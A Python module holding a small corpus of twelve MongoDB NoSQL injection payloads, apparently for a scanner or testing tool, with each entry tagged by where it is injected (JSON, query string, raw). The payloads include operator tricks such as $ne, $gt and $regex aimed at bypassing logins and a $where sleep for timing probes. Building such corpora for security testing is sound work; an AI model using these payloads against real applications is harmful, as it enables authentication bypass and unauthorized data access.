"""NoSQL injection payload corpus (MongoDB / operators)."""

from __future__ import annotations

PAYLOADS = [
    {"id": "N1", "payload": '{"$gt": ""}', "place": "json", "db": "mongo"},
    {"id": "N2", "payload": '{"$ne": null}', "place": "json", "db": "mongo"},
    {"id": "N3", "payload": '{"$regex": ".*"}', "place": "json", "db": "mongo"},
    {"id": "N4", "payload": "true, $where: '1 == 1'", "place": "raw", "db": "mongo"},
    {"id": "N5", "payload": "';[$ne]=1", "place": "query", "db": "mongo"},
    {"id": "N6", "payload": "password[$gt]=", "place": "query", "db": "mongo"},
    {"id": "N7", "payload": "username[$regex]=^admin", "place": "query", "db": "mongo"},
    {"id": "N8", "payload": '{"$where": "sleep(1000)"}', "place": "json", "db": "mongo"},
    {"id": "N9", "payload": "';[$nin][]=invalid", "place": "query", "db": "mongo"},
    {"id": "N10", "payload": "{\"$or\":[{},{\"a\":\"a\"}]}", "place": "json", "db": "mongo"},
    {"id": "N11", "payload": "';[$exists]=true", "place": "query", "db": "mongo"},
    {"id": "N12", "payload": "';[$eq]=admin&password[$ne]=x", "place": "query", "db": "mongo"},
]


def list_payloads() -> dict:
    return {"payloads": PAYLOADS, "total": len(PAYLOADS), "engine": "nosqli-class"}
